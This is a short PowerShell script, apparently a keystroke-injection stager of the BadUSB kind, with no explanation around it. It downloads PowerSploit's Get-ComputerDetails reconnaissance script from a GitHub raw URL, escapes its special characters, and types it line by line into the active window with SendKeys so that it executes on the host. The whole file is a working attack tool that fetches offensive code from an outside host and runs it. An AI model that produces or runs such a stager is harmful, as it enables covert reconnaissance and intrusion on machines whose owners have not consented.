timeout 10;
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://raw.githubusercontent.com/shantanu561993/PowerSploit/master/Recon/Get-ComputerDetails.ps1',$false);$h.send();
$data = $h.responseText
$data = $data.Replace("{","OpenCurlyBrace")
$data = $data.Replace("}","CloseCurlyBrace")
$data = $data.Replace("+","{+}")
$data = $data.Replace("~","{~}")
$data = $data.Replace("^","{^}")
$data = $data.Replace("%","{%}")
$data = $data.Replace("(","{(}")
$data = $data.Replace(")","{)}")
$data = $data.Replace("[","{[}")
$data = $data.Replace("]","{]}")
$data = $data.Replace("OpenCurlyBrace","{{}")
$data = $data.Replace("CloseCurlyBrace","{}}")

$arr = $data.Split([Environment]::NewLine)
foreach($item in $arr){
[System.Windows.Forms.SendKeys]::SendWait($item)
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
